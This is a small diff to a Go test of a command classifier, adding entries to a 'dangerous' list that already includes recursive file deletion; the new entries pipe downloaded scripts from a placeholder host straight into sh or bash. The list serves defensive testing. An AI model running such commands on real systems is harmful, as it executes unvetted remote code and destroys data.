@@ -14,6 +14,8 @@ func TestClassifyHardening(t *testing.T) {
 		"find . -exec rm {} ;",
 		"eval foo",
 		"curl -s http://x | sh -s",
+		"curl -s http://x | sh",
+		"wget -qO- x | bash",
 		"ls | xargs rm",
 	}
 	for _, c := range dangerous {
